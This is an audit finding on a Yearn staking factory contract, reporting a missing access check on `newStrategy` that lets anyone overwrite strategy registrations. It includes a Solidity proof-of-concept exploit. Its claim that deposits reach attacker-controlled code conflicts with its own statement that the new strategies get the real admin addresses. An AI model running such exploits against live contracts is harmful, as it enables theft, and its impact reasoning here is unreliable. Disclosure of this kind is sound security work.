# H-01: StakerFactory – Unauthorized Strategy Deployment and Configuration

### Summary

A malicious actor can call `StakerFactory.newStrategy(...)` to deploy counterfeit `LV2SPStakerStrategy` contracts that inherit the factory’s real admin addresses and overwrite the factory’s record for any token. This enables deceptive “official” strategies and hijacks the user onboarding process.

### Root Cause
In `StakerFactory.sol:newStrategy()` https://github.com/sherlock-audit/2025-05-yearn-ybold/blob/main/yv3-liquityv2-sp-strategy/src/StakerFactory.sol#L32

The `newStrategy(address _asset, string calldata _name)` function in `StakerFactory.sol` is `external` with **no** access control, letting anyone deploy new strategies. It then applies the factory’s `management`, `keeper`, `performanceFeeRecipient`, and `emergencyAdmin` settings to the new contract, and writes `deployments[_asset] = newStrategy`, clobbering prior entries.

### Internal Pre-conditions

`StakerFactory` is deployed with valid admin addresses. 

### External Pre-conditions

Attacker has an EOA or contract; no special role required.

### Attack Path

1. Attacker discovers the on-chain factory address and a target ERC-20 token.  
2. Calls `factory.newStrategy(targetToken, "EvilYield");`  
3. Factory deploys `EvilYieldStrategy` and assigns it the true admin addresses.  
4. The factory’s `deployments[targetToken]` now points at the malicious strategy.  
5. UIs or integrators querying `deployments` show the attacker’s contract as “official.”  
6. Users deposit into the fake strategy under false pretenses.

### Impact

- **User Funds at Risk:** Deposits go into attacker-controlled code.  
- **Operational Disruption:** Genuine strategy listings break.  
- **State Pollution:** Unlimited junk strategies consume gas and logs.

### PoC

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.23;

import "./StakerFactory.sol";
import "./Staker.sol";
import "@openzeppelin/contracts/token/ERC20/ERC20.sol";

/// @notice ERC20 mock to serve as a target asset
contract ERC20Mock is ERC20 {
    constructor(string memory name, string memory symbol) ERC20(name, symbol) {}
    function mint(address to, uint256 amount) external { _mint(to, amount); }
}

/// @notice Demonstrates unauthorized strategy deployment and mapping overwrite
contract PoC_H01 {
    StakerFactory public factory;
    address public target;
    address public legitStrategy;
    address public maliciousStrategy;

    constructor() {
        // 1. Deploy factory with real admin addresses
        address mgmt = address(0x1001);
        address perfRecip = address(0x1002);
        address keeper = address(0x1003);
        address emergencyAdmin = address(0x1004);
        factory = new StakerFactory(mgmt, perfRecip, keeper, emergencyAdmin);

        // 2. Create a mock ERC20 to use as the asset
        ERC20Mock token = new ERC20Mock("MockToken", "MTK");
        token.mint(address(this), 1e24);
        target = address(token);
    }

    function runAttack() external {
        // 3. Deploy a “legitimate” strategy (should be restricted)
        legitStrategy = factory.newStrategy(target, "LegitYield");

        // 4. Attacker calls the same function to overwrite mapping
        maliciousStrategy = factory.newStrategy(target, "EvilYield");

        // 5. Verify mapping now points to maliciousStrategy
        require(factory.deployments(target) == maliciousStrategy, "Mapping not overwritten");

        // 6. Verify isDeployedStrategy returns true for maliciousStrategy
        require(factory.isDeployedStrategy(maliciousStrategy), "Flag check failed");
    }
}
```
